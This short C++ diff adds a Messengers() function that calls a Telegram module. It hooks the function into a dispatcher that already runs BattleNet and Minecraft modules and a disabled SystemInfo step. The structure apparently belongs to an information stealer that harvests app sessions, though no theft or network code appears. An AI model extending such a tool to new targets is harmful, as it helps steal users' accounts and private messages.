@@ -38,6 +38,7 @@ void SystemInfo();
 
 void Gaming();
 
+void Messengers();
 
 
 /// <summary>
@@ -62,6 +63,9 @@ void Functions()
 	//SystemInfo();
 
 	Gaming();
+
+	Messengers();
+
 }
 
 void SystemInfo() 
@@ -84,4 +88,9 @@ void Gaming()
 	gaming::BattleNet();
 
 	gaming::Minecraft();
+}
+
+void Messengers() 
+{
+	messengers::Telegram();
 }
